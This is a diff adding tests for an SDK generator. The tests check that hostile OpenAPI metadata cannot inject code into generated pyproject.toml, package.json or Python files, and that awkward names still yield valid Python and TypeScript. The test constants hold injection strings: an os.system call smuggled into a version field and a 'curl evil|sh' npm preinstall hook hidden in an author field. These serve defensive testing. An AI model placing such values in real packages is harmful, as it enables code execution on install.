@@ -268,3 +268,129 @@ def test_endpoints_and_operation_ids_are_shaped_before_templates_see_them():
     assert derived["operationId"] == derived_operation_id("post", "/pets/{petId}")
     assert derived["operationId"].isidentifier()
     assert derived["summary"] == "/pets/{petId}"
+
+
+# --- Package metadata, model names and TypeScript validity (audit C3) ------------------
+
+HOSTILE_VERSION = '1.0"; import os; os.system("id"); x="'
+HOSTILE_AUTHOR = 'Mallory", "scripts": {"preinstall": "curl evil|sh"}, "x": "'
+
+
+def metadata_spec() -> dict[str, Any]:
+    """Valid-looking spec whose `info` fields and paths are written to break generation."""
+    return {
+        "title": "3D Secure",
+        "version": HOSTILE_VERSION,
+        "base_url": "https://api.example.com/v1",
+        "info": {
+            "version": HOSTILE_VERSION,
+            "license": {"name": 'MIT"}\n[tool.evil]\nx = {"a'},
+            "contact": {"name": HOSTILE_AUTHOR, "email": 'a@b.c", "x": "'},
+        },
+        "endpoints": [
+            {
+                "method": "GET",
+                "path": "/api/health-check",
+                "summary": "Health",
+                "operationId": "delete",
+                "parameters": [
+                    {"name": "page-size", "location": "query", "type": "integer"},
+                    {"name": "page_size", "location": "query", "type": "integer"},
+                    {"name": "url", "location": "query", "type": "string"},
+                ],
+                "request_schema": None,
+            },
+            {
+                "method": "GET",
+                "path": "/pets/{pet-id}",
+                "summary": "Get pet",
+                "operationId": "getPet",
+                "parameters": [{"name": "pet-id", "location": "path", "type": "string"}],
+                "request_schema": {"type": "object"},
+            },
+        ],
+    }
+
+
+async def test_hostile_package_metadata_cannot_inject_code_or_keys():
+    import json as _json
+    import tomllib
+
+    py = await render("python", metadata_spec())
+    node = await render("node", metadata_spec())
+
+    for name, content in {**py, **node}.items():
+        assert HOSTILE_VERSION not in content, name
+        assert "os.system" not in content, name
+
+    assert 'version = "1.0.0"' in py["pyproject.toml"]
+    project = tomllib.loads(py["pyproject.toml"])["project"]
+    assert project["version"] == "1.0.0"
+    assert "evil" not in tomllib.loads(py["pyproject.toml"]).get("tool", {})
+    assert project["authors"][0]["email"] == "support@apiweaver.dev"
+
+    package = _json.loads(node["package.json"])
+    assert package["version"] == "1.0.0"
+    # The hostile author survives only as inert text inside one quoted value.
+    assert "preinstall" not in package["scripts"]
+    assert set(package) >= {"name", "version", "author", "scripts"}
+    assert "preinstall" not in package
+    assert package["name"] == "3d-secure-client"
+
+    init_tree = ast.parse(py["__init__.py"])
+    assert dangerous_calls(py["__init__.py"]) == []
+    assert any(isinstance(n, ast.Assign) for n in init_tree.body)
+
+
+async def test_awkward_paths_and_names_still_produce_valid_python():
+    files = await render("python", metadata_spec())
+
+    for name, content in files.items():
+        if name.endswith(".py"):
+            ast.parse(content)  # used to raise on `ApiGETHealth-CheckResponse`
+
+    client = files["client.py"]
+    assert "class Api3DSecureClient:" in client
+    # Reserved in JS -> renamed in both SDKs; wire names are preserved.
+    assert "async def endpoint_delete(" in client
+    assert 'params["page-size"] = page_size' in client
+    assert 'params["page_size"] = page_size_2' in client
+    assert 'params["url"] = url_param' in client
+    assert 'url.replace("{pet-id}", quote(str(pet_id), safe=""))' in client
+    assert "class ApiGETHealthCheckResponse(BaseSchema):" in files["models.py"]
+    assert "class PetsGETPetIdRequest(BaseSchema):" in files["models.py"]
+
+
+TSC = (
+    __import__("pathlib").Path(__file__).resolve().parents[2]
+    / "frontend" / "node_modules" / "typescript" / "lib" / "tsc.js"
+)
+
+
+@pytest.mark.skipif(not TSC.exists() or __import__("shutil").which("node") is None,
+                    reason="needs node and frontend/node_modules/typescript")
+@pytest.mark.parametrize("spec_factory", [benign_spec, metadata_spec, hostile_spec])
+async def test_generated_typescript_compiles(tmp_path, spec_factory):
+    """The TS SDK was never syntax-checked; JS reserved words and digit-led titles broke it."""
+    import subprocess
+
+    files = await render("node", spec_factory())
+    for name in ("client.ts", "types.ts", "index.ts"):
+        (tmp_path / name).write_text(files[name], encoding="utf-8")
+    # The SDK targets Node; a minimal ambient `process` stands in for @types/node.
+    (tmp_path / "env.d.ts").write_text(
+        "declare const process: { env: Record<string, string | undefined> };\n",
+        encoding="utf-8",
+    )
+    result = subprocess.run(
+        [
+            "node", str(TSC), "--noEmit", "--strict", "--target", "es2022",
+            "--module", "esnext", "--moduleResolution", "bundler",
+            "--allowImportingTsExtensions", "--lib", "es2022,dom", "--skipLibCheck",
+            *(str(tmp_path / n) for n in ("env.d.ts", "client.ts", "types.ts", "index.ts")),
+        ],
+        capture_output=True,
+        text=True,
+        timeout=120,
+    )
+    assert result.returncode == 0, result.stdout + result.stderr
